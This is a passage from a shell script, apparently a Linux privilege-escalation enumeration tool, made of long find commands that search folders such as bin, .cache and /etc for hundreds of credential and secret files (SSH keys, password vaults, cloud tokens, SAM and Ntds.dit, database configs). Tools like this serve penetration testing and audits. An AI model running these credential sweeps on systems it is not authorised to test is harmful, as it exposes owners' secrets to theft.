\"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1151	  FIND_BIN=`eval_bckgrd "find ${ROOT_FOLDER}bin -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1152	  FIND_CACHE=`eval_bckgrd "find ${ROOT_FOLDER}.cache -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1153	  FIND_CDROM=`eval_bckgrd "find ${ROOT_FOLDER}cdrom -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1154	  FIND_ETC=`eval_bckgrd "find ${ROOT_FOLDER}etc -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"*knockd*\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \"exports\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
